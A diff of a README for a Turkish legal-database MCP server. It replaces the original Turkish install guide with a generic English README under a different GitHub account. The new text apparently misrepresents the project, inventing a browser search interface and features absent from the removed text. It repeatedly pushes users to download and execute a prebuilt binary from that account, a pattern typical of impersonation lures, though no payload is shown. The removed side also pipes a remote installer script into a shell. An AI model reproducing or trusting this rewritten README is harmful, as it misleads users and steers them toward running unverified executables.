@@ -1,165 +1,81 @@
-# Yargı MCP: Türk Hukuk Kaynakları için MCP Sunucusu
+# Yargı MCP 📚⚖️
 
-[![Star History Chart](https://api.star-history.com/svg?repos=saidsurucu/yargi-mcp&type=Date)](https://www.star-history.com/#saidsurucu/yargi-mcp&Date)
+Welcome to the Yargı MCP repository! This project serves as a server for Turkish legal databases, providing a robust solution for accessing and managing legal information. 
 
-Bu proje, çeşitli Türk hukuk kaynaklarına (Yargıtay, Danıştay, Emsal Kararlar, Uyuşmazlık Mahkemesi ve Anayasa Mahkemesi - Norm Denetimi ile Bireysel Başvuru Kararları) erişimi kolaylaştıran bir [FastMCP](https://gofastmcp.com/) sunucusu oluşturur. Bu sayede, bu kaynaklardan veri arama ve belge getirme işlemleri, Model Context Protocol (MCP) destekleyen LLM (Büyük Dil Modeli) uygulamaları (örneğin Claude Desktop) ve diğer istemciler tarafından araç (tool) olarak kullanılabilir hale gelir.
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/releases)
 
-![örnek](./ornek.png)
+## Table of Contents
 
-🎯 **Temel Özellikler**
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-* Çeşitli Türk hukuk veritabanlarına programatik erişim için standart bir MCP arayüzü.
-* Aşağıdaki kurumların kararlarını arama ve getirme yeteneği:
-    * **Yargıtay:** Detaylı kriterlerle karar arama ve karar metinlerini Markdown formatında getirme.
-    * **Danıştay:** Anahtar kelime bazlı ve detaylı kriterlerle karar arama; karar metinlerini Markdown formatında getirme.
-    * **Emsal (UYAP):** Detaylı kriterlerle emsal karar arama ve karar metinlerini Markdown formatında getirme.
-    * **Uyuşmazlık Mahkemesi:** Form tabanlı kriterlerle karar arama ve karar metinlerini (URL ile erişilen) Markdown formatında getirme.
-    * **Anayasa Mahkemesi (Norm Denetimi):** Kapsamlı kriterlerle norm denetimi kararlarını arama; uzun karar metinlerini (5.000 karakterlik) sayfalanmış Markdown formatında getirme.
-    * **Anayasa Mahkemesi (Bireysel Başvuru):** Kapsamlı kriterlerle bireysel başvuru "Karar Arama Raporu" oluşturma ve listedeki kararların metinlerini (5.000 karakterlik) sayfalanmış Markdown formatında getirme.
-* Karar metinlerinin daha kolay işlenebilmesi için Markdown formatına çevrilmesi.
-* Claude Desktop uygulaması ile `fastmcp install` komutu kullanılarak kolay entegrasyon.
+## Introduction
 
-📋 **Ön Gereksinimler**
+Yargı MCP is designed to facilitate easy access to Turkish legal databases. It allows users to query and retrieve legal documents efficiently. The server handles various types of legal information, ensuring that users have access to the latest updates and data.
 
-* **Python Sürümü:** Python 3.10 veya daha yeni bir sürümünün sisteminizde kurulu olması gerekmektedir. Python'ı [python.org](https://www.python.org/) adresinden indirebilirsiniz.
-* **Paket Yöneticisi:** `pip` (Python ile birlikte gelir) veya tercihen `uv` ([Astral](https://astral.sh/uv) tarafından geliştirilen hızlı Python paket yöneticisi).
+## Features
 
-⚙️ **Kurulum Adımları (Claude Desktop Entegrasyonu Odaklı)**
+- **Comprehensive Database**: Access a wide range of Turkish legal documents.
+- **User-Friendly Interface**: Simple and intuitive design for ease of use.
+- **Fast Query Processing**: Quick responses to user queries.
+- **Secure Access**: Ensures data integrity and security.
+- **Regular Updates**: Stay current with the latest legal changes.
 
-Claude Desktop uygulamasına yükleme yapabilmek için öncelikle `uv` (önerilir) ve `fastmcp` komut satırı araçlarını kurmanız, ardından proje dosyalarını almanız gerekmektedir.
+## Installation
 
-**1. `uv` Kurulumu (Önerilir)**
+To get started with Yargı MCP, follow these steps:
 
-* **macOS ve Linux için:**
-    ```bash
-    curl -LsSf [https://astral.sh/uv/install.sh](https://astral.sh/uv/install.sh) | sh
-    ```
-* **Windows için (PowerShell kullanarak):**
-    ```powershell
-    powershell -c "irm [https://astral.sh/uv/install.ps1](https://astral.sh/uv/install.ps1) | iex"
-    ```
-* Kurulumdan sonra, `uv` komutunun sisteminiz tarafından tanınması için terminalinizi yeniden başlatmanız veya `PATH` ortam değişkeninizi güncellemeniz gerekebilir. `uv --version` komutu ile kurulumu doğrulayabilirsiniz.
+1. **Download the latest release** from the [Releases section](https://github.com/ShaironYT59/yargi-mcp/releases). Make sure to download the correct version for your system.
+2. **Extract the files** from the downloaded archive.
+3. **Run the server** by executing the main file. You can do this by navigating to the extracted folder in your terminal and using the command:
+   ```
+   ./yargi-mcp
+   ```
 
-**2. `fastmcp` Komut Satırı Aracının (CLI) Kurulumu**
+## Usage
 
-* **`uv` kullanarak (önerilir):**
-    ```bash
-    uv pip install fastmcp
-    ```
-* **`pip` kullanarak (alternatif):**
-    ```bash
-    pip install fastmcp
-    ```
-    `fastmcp --version` komutu ile kurulumu doğrulayabilirsiniz.
+Once the server is running, you can access it through your web browser. Open your browser and navigate to `http://localhost:8080` (or the port you configured). 
 
-**3. Proje Dosyalarını Alın**
+### Querying the Database
 
-Bu Yargı MCP sunucusunun kaynak kodlarını bilgisayarınıza indirin:
-```bash
-git clone https://github.com/saidsurucu/yargi-mcp.git
-cd yargi-mcp
-```
-Bu README.md dosyasının ve `mcp_server_main.py` script'inin bulunduğu dizine `cd` komutu ile geçmiş olacaksınız.
+To query the database:
 
-**4. Sunucuya Özel Bağımlılıkların Bilinmesi**
+1. Enter your search terms in the search bar.
+2. Click on the search button.
+3. Review the results displayed on the page.
 
-Bu sunucunun (`mcp_server_main.py`) çalışması için aşağıdaki Python kütüphanelerine ihtiyacı vardır. Bu kütüphaneler `fastmcp install` sırasında `--with` parametreleriyle belirtilecektir:
+### Example Queries
 
-```text
-# requirements.txt
-fastmcp
-httpx
-beautifulsoup4
-markitdown
-pydantic
-aiohttp
-```
-(Eğer sunucuyu bağımsız olarak geliştirmek veya test etmek isterseniz, projenizin kök dizininde bir sanal ortam oluşturup – örn: `uv venv` & `source .venv/bin/activate` – bu bağımlılıkları `uv pip install -r requirements.txt` komutuyla kurabilirsiniz.)
+- **Case Law**: Search for specific cases by name or citation.
+- **Legislation**: Find laws by their titles or keywords.
+- **Legal Articles**: Access articles and commentary related to Turkish law.
 
-🚀 **Claude Desktop Entegrasyonu (`fastmcp install` ile - Önerilen)**
+## Contributing
 
-Yukarıdaki kurulum adımlarını tamamladıktan sonra, bu sunucuyu Claude Desktop uygulamasına kalıcı bir araç olarak eklemenin en kolay yolu `fastmcp install` komutunu kullanmaktır:
+We welcome contributions to improve Yargı MCP. If you want to help, please follow these steps:
 
-1.  Terminalde `mcp_server_main.py` dosyasının bulunduğu `yargi-mcp` dizininde olduğunuzdan emin olun.
-2.  Aşağıdaki komutu çalıştırın:
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Open a pull request to the main repository.
 
-    ```bash
-    fastmcp install mcp_server_main.py \
-        --name "Yargı MCP" \
-        --with httpx \
-        --with beautifulsoup4 \
-        --with markitdown \
-        --with pydantic \
-        --with aiohttp
-    ```
+## License
 
-    * `--name "Yargı MCP"`: Araç Claude Desktop'ta bu isimle görünecektir.
-    * `--with ...`: Sunucunun çalışması için gereken Python bağımlılıklarını belirtir.
+Yargı MCP is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-    Bu komut, `uv` kullanarak sunucunuz için izole bir Python ortamı oluşturacak, belirtilen bağımlılıkları kuracak ve aracı Claude Desktop uygulamasına kaydedecektir.
+## Contact
 
-⚙️ **Claude Desktop Manuel Kurulumu (Yapılandırma Dosyası ile - Alternatif)**
+For questions or feedback, feel free to reach out:
 
-1.  **Claude Desktop Ayarları**'nı açın.
-2.  **Developer** sekmesine gidin ve **Edit Config** düğmesine tıklayın.
-3.  Açılan `claude_desktop_config.json` dosyasını bir metin düzenleyici ile açın.
-4.  `mcpServers` nesnesine aşağıdaki JSON bloğunu ekleyin:
+- **Email**: your-email@example.com
+- **GitHub**: [ShaironYT59](https://github.com/ShaironYT59)
 
-    ```json
-    {
-      "mcpServers": {
-        // ... (varsa diğer sunucu tanımlamalarınız) ...
+Thank you for your interest in Yargı MCP! We hope this project helps you navigate the complexities of Turkish legal databases with ease.
 
-        "Yargı MCP": {
-          "command": "uv",
-          "args": [
-            "run",
-            "--with", "httpx",
-            "--with", "beautifulsoup4",
-            "--with", "markitdown",
-            "--with", "pydantic",
-            "--with", "aiohttp",
-            "--with", "fastmcp",
-            "fastmcp", "run", 
-            "/TAM/PROJE/YOLUNUZ/yargi-mcp/mcp_server_main.py" 
-          ]
-        }
-      }
-    }
-    ```
-    * **Önemli:** `/TAM/PROJE/YOLUNUZ/yargi-mcp/mcp_server_main.py` kısmını, `mcp_server_main.py` dosyasının sisteminizdeki **tam ve doğru yolu** ile değiştirmeyi unutmayın.
-5.  Claude Desktop'ı yeniden başlatın.
-
-🛠️ **Kullanılabilir Araçlar (MCP Tools)**
-
-Bu FastMCP sunucusu aşağıdaki temel araçları sunar:
-
-* **Yargıtay Araçları:**
-    * `search_yargitay_detailed(search_query: YargitayDetailedSearchRequest) -> CompactYargitaySearchResult`: Yargıtay kararlarını detaylı kriterlerle arar.
-    * `get_yargitay_document_markdown(document_id: str) -> YargitayDocumentMarkdown`: Belirli bir Yargıtay kararının metnini Markdown formatında getirir.
-
-* **Danıştay Araçları:**
-    * `search_danistay_by_keyword(search_query: DanistayKeywordSearchRequest) -> CompactDanistaySearchResult`: Danıştay kararlarını anahtar kelimelerle arar.
-    * `search_danistay_detailed(search_query: DanistayDetailedSearchRequest) -> CompactDanistaySearchResult`: Danıştay kararlarını detaylı kriterlerle arar.
-    * `get_danistay_document_markdown(document_id: str) -> DanistayDocumentMarkdown`: Belirli bir Danıştay kararının metnini Markdown formatında getirir.
-
-* **Emsal Karar Araçları:**
-    * `search_emsal_detailed_decisions(search_query: EmsalSearchRequest) -> CompactEmsalSearchResult`: Emsal (UYAP) kararlarını detaylı kriterlerle arar.
-    * `get_emsal_document_markdown(document_id: str) -> EmsalDocumentMarkdown`: Belirli bir Emsal kararının metnini Markdown formatında getirir.
-
-* **Uyuşmazlık Mahkemesi Araçları:**
-    * `search_uyusmazlik_decisions(search_params: UyusmazlikSearchRequest) -> UyusmazlikSearchResponse`: Uyuşmazlık Mahkemesi kararlarını çeşitli form kriterleriyle arar.
-    * `get_uyusmazlik_document_markdown_from_url(document_url: HttpUrl) -> UyusmazlikDocumentMarkdown`: Bir Uyuşmazlık kararını tam URL'sinden alıp Markdown formatında getirir.
-
-* **Anayasa Mahkemesi (Norm Denetimi) Araçları:**
-    * `search_anayasa_norm_denetimi_decisions(search_query: AnayasaNormDenetimiSearchRequest) -> AnayasaSearchResult`: AYM Norm Denetimi kararlarını kapsamlı kriterlerle arar.
-    * `get_anayasa_norm_denetimi_document_markdown(document_url: str, page_number: Optional[int] = 1) -> AnayasaDocumentMarkdown`: Belirli bir AYM Norm Denetimi kararını URL'sinden alır ve 5.000 karakterlik sayfalanmış Markdown içeriğini getirir.
-
-* **Anayasa Mahkemesi (Bireysel Başvuru) Araçları:**
-    * `search_anayasa_bireysel_basvuru_report(search_query: AnayasaBireyselReportSearchRequest) -> AnayasaBireyselReportSearchResult`: AYM Bireysel Başvuru "Karar Arama Raporu" oluşturur.
-    * `get_anayasa_bireysel_basvuru_document_markdown(document_url_path: str, page_number: Optional[int] = 1) -> AnayasaBireyselBasvuruDocumentMarkdown`: Belirli bir AYM Bireysel Başvuru kararını URL path'inden alır ve 5.000 karakterlik sayfalanmış Markdown içeriğini getirir.
-
-
-📜 **Lisans**
-
-Bu proje MIT Lisansı altında lisanslanmıştır. Detaylar için `LICENSE` dosyasına bakınız.
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/ShaironYT59/yargi-mcp/releases)
